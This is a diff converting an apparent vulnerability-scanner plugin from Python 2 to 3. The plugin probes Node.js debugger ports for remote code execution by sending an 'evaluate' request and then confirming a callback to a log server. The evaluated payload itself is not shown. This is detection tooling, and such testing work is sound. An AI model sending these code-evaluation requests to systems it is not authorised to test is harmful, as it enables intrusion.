@@ -8,7 +8,7 @@ import string
 import random
 import time
 try:
-    import urllib2
+    import urllib.request, urllib.error, urllib.parse
 except Exception as e:
     import urllib.request as urllib2
 
@@ -25,7 +25,7 @@ def get_plugin_info():
     return plugin_info
 
 def build_payload(cmd=""):
-        payload = u'''{
+        payload = '''{
             "seq": 1,
             "type": "request",
             "command": "evaluate",
@@ -35,7 +35,7 @@ def build_payload(cmd=""):
                 "maxStringLength": -1
             }
         }'''
-        data = u"Content-Length: {}\r\n\r\n".format(len(payload)) + payload
+        data = "Content-Length: {}\r\n\r\n".format(len(payload)) + payload
         return data.encode()
 
 
@@ -50,7 +50,7 @@ def ip_address(ip, port):
 def dnslog_check(server, hash_str):
     url = "http://{}:8088/{}".format(server, hash_str)
     try:
-        content = urllib2.urlopen(url, timeout=5).read()
+        content = urllib.request.urlopen(url, timeout=5).read()
     except Exception as e:
         return False
     else:
@@ -79,9 +79,9 @@ def check(ip, port, timeout):
     else:
         time.sleep(2)
         if dnslog_check(server, check_str):
-            return u"nodejs 远程命令执行漏洞"
+            return "nodejs 远程命令执行漏洞"
 
 
 if __name__ == '__main__':
-    print(check("127.0.0.1", 5858, 10))
+    print((check("127.0.0.1", 5858, 10)))
         
